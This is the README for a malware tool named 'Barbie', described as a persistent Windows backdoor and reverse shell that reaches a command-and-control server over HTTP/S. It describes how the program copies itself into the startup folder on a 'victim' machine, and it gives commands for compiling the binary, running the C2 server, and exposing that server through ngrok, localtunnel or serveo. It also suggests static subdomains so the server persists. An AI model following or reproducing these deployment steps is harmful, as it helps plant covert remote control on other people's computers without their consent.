# Barbie
A simple, persisent windows toy backdoor/reverse-shell using HTTP/S to communicate with the C2 server.

Once the victim starts the executable it locates itself on default startup programs directory, then it tries to establish a connection.
## Setup
Edit the line 6 with your own domain.
#### Compile
`gcc barbie.c -o startupsrvc -w -mwindows`
#### Setting up your machine as temporary C2 server
Start your server with `python3 server.py`, this will run your server on the port 5001, feel free to change that.<br>
For using a self-signed TLS certificate add `ssl_context="adhoc"` in the last line of the code, this may cause problems if you use the below mentioned tunneling services.

To avoid different code pages i used utf-8 to decode the raw data sent by the client.<br>
See [this link](https://docs.python.org/3/library/codecs.html#standard-encodings) to see the right encoding format for your country.

Now you have to expose your localhost on the internet, there are various methods to do this:
   * Setting up port forwarding by opening the choosen port for your pc on your modem router (unless you're under a Carrier-grade NAT)
   * Using a reverse proxy to start an HTTPS tunnel:
     * [Ngrok](https://ngrok.com): `ngrok http 5001`
     * [Localtunnel](https://theboroer.github.io/localtunnel-www/): `lt --port 5001 --subdomain <choose a name>`
     * [Serveo](https://serveo.net) through SSH: `ssh -R <choose a name>.serveo.net:80:localhost:5001 serveo.net`

These services will automatically generate TLS certificates.
### Static subdomains for tunneling services
Obviously you want your subdomain to last longer.

* For ngrok see [this guide](https://ngrok.com/blog-post/free-static-domains-ngrok-users)
* For serveo and localtunnel, just choose a name that anyone wouldn't guess
  

if you're not using a tunneling service you could try [duckdns](https://www.duckdns.org/)
### Post exploitation
[Here](https://www.google.com/search?q=windows+post+exploitation)
